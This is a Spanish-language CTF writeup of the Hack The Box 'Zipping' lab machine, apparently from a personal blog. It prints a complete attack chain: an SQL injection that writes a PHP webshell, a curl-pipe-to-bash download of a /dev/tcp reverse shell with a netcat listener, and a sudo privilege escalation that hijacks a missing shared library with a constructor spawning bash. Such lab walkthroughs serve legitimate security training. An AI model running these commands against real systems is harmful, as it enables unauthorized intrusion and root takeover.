---
layout: single
title: HTB Zipping writeup
date: 2023-11-07
classes: wide
categories:
  - writeups
tags:
  - HTB
  - writeup
  - pentesting
---







<h1>Resumen || </h1><br>
<div style="text-align: justify;">
Tengo constancia de que antes esta máquina se resolvía por otro método más interesante. Este trataba de generar un `.pdf` malicioso que fuera leído por la aplicación web como un pdf, pero como un php por el servidor. Hack The Box la actualizó y, hasta ahora, no he sabido replicar esa vulnerabilidad. 

Aquí muestro la solución a noviembre de 2023:
</div>
<br><br>


# Reconocimiento 

Aplicamos un escaneo de puertos y servicios a la máquina víctima:

```shell
nmap -sV 10.10.11.229 -n -oN scan.txt -T5 -vvv
```

![](/assets/images/HTB-writeup-zipping/Pasted image 20231108144349.png)
Tenemos un servidor http en el puerto 80. 
## Web

Tras revisar la web en profundidad, encontramos que funciona con .php: 


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108144743.png)

# Penetración

## User

Introduciendo la petición del link anterior en el Repeater de BP podemos testar si podemos realizar SQLInjection a través de la aplicación PHP. 


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108151829.png)

Éxito. La aplicación acoge peticiones cuando las comenzamos con un salto de línea (`%0A`). 

Ahora vamos a generar una Reverse Shell que subiremos con una petición curl al servidor, para después ejecutarla y tomar acceso. 

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
#Aquí debemos poner nuestra IP y el puerto que más tarde abriremos con netcat. y guardarlo como 'shell.sh'
```

Abrimos un puerto 80 en la carpeta donde se encuentra la shell. 

```shell
python3 -m http.server 80
```

En otra consola, abrimos el puerto: 

```shell
nc -nlvp <port>
```

Ahora, vamos a hacer las peticiones directamente desde consola, porque así nos ahorramos el paso de urlear el comando: 

```shell
curl $'http://zipping.htb/shop/index.php?page=product&id=%0A\'%3bselect+\'<%3fphp+system(\"curl+http%3a//<tu-ip>/rev.sh|bash\")%3b%3f>\'+into+outfile+\'/var/lib/mysql/shell.php\'+%231'

curl -s $'http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2fshell' 
```

Una vez ejecutadas ambas peticiones, en la consola del netcat debería aparecernos el acceso: 


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108152810.png)

### Conseguir una shell funcional

Como siempre en estos casos, vamos a obtener una shell 100% funcional: 

```shell
script /dev/null -c bash
tty
CTRL+Z
stty raw -echo;fg
reset
xterm
export TERM=xterm
```

Encontraremos la `user.txt`en la carpeta home del usuario, que aunque no esté definida en las variables de entorno, es accesible:
`/home/rektsu/user.txt`.



## Escalada de Privilegios

Revisamos si tenemos algún permiso de ejecución como sudo: 


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108153443.png)

Vamos a ver de qué trata el script `stock` con el siguiente comando: 

```shell
strings $(which stock)
```

Revisando el output, encontramos una credencial:


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108154111.png)

`St0ckM4nager`


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108154215.png)

Ejecutando `strace stock` e introduciendo la contraseña encontrada nos da la siguiente información: 


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108155849.png)

Es decir, el programa está llamando a un archivo llamado `/home/rektsu/.config/libcounter.so`  que no existe. Si este programa se ejecuta con permisos sudo, podemos crear ese archivo para que desde él nos lleve al usuario root. 

Vamos al directorio `/home/rektsu/.config/`

Y creamos un archivo `libcounter.c`con el siguiente contenido:

```c
#include <stdio.h>
#include <stdlib.h>

void escalation_func() {
	system("/bin/bash");
}

__attribute__((constructor))
void setup() {
	escalation_func();
}
```

Ahora lo compilamos como una librería, tal como el stock nos pedía más arriba: 

```shell
gcc -shared -o libcounter.so -fPIC libcounter.c
```

Tras esto, volvemos a ejecutar el script stock: 

```shell
sudo stock
St0ckM4nager
```


![](/assets/images/HTB-writeup-zipping/Pasted image 20231108160859.png)

